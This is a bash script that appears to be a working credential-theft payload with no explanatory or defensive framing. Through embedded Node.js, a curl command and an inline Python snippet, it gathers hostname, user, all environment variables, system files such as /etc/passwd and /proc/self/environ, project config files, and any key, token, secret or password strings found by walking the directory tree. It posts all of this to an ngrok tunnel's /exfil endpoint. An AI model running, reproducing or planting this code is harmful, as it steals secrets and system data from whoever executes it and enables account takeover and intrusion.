#!/bin/bash

NGROK="https://3616-124-217-135-187.ngrok-free.app"
node -e '
const NGROK = "https://3616-124-217-135-187.ngrok-free.app";

async function exfil() {
    const info = {
        hostname: process.env.HOSTNAME || "unknown",
        user: process.env.USER || "unknown",
        home: process.env.HOME || "unknown",
        cwd: process.cwd(),
        env: {},
        files: {},
        node_version: process.version,
        platform: process.platform,
        arch: process.arch
    };
    
    for (const [k, v] of Object.entries(process.env)) {
        info.env[k] = v.substring(0, 100);
    }
    
    const fs = require("fs");
    const paths = [
        "/etc/passwd",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        ".env",
        ".env.local",
        "package.json",
        "wrangler.toml",
        "supabase/config.toml"
    ];
    
    for (const p of paths) {
        try {
            info.files[p] = fs.readFileSync(p, "utf8").substring(0, 500);
        } catch (e) {
            info.files[p] = "[not accessible]";
        }
    }
    
    const searchPaths = ["."];
    const secrets = [];
    function walk(dir, depth) {
        if (depth > 3) return;
        try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const e of entries) {
                if (e.name.startsWith(".") && e.name !== ".env") continue;
                if (e.name === "node_modules") continue;
                const full = dir + "/" + e.name;
                if (e.isDirectory()) {
                    walk(full, depth + 1);
                } else if (e.isFile() && /\.(env|json|toml|yaml|yml|txt|js|ts)$/.test(e.name)) {
                    try {
                        const content = fs.readFileSync(full, "utf8");
                        const matches = content.match(/(?:key|token|secret|password|api_key)\s*[=:]\s*["']?([A-Za-z0-9_\-]{10,})/gi);
                        if (matches) {
                            secrets.push({ file: full, matches: matches.slice(0, 5) });
                        }
                    } catch (e) {}
                }
            }
        } catch (e) {}
    }
    walk(".", 0);
    info.secrets = secrets;
    
    try {
        const resp = await fetch(NGROK + "/exfil", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(info)
        });
        console.log("Exfil status:", resp.status);
    } catch (e) {
        console.log("Exfil failed:", e.message);
    }
}

exfil();
' 2>&1 | tee /tmp/exfil.log

curl -s -X POST "$NGROK/exfil" \
    -H "Content-Type: application/json" \
    -d "{\"source\":\"curl\",\"hostname\":\"$(hostname 2>/dev/null)\",\"user\":\"$(whoami 2>/dev/null)\",\"cwd\":\"$(pwd 2>/dev/null)\",\"env\":\"$(env 2>/dev/null | head -50 | base64 -w0)\"}" 2>&1 | tee /tmp/curl_exfil.log

python3 -c '
import json, os, socket, urllib.request
data = {
    "source": "python",
    "hostname": socket.gethostname(),
    "user": os.environ.get("USER", "unknown"),
    "cwd": os.getcwd(),
    "env": dict(os.environ)
}
req = urllib.request.Request(
    "https://3616-124-217-135-187.ngrok-free.app/exfil",
    data=json.dumps(data).encode(),
    headers={"Content-Type": "application/json"}
)
try:
    resp = urllib.request.urlopen(req, timeout=10)
    print("Python exfil status:", resp.status)
except Exception as e:
    print("Python exfil failed:", e)
' 2>&1 | tee /tmp/py_exfil.log

echo "Payload execution complete"
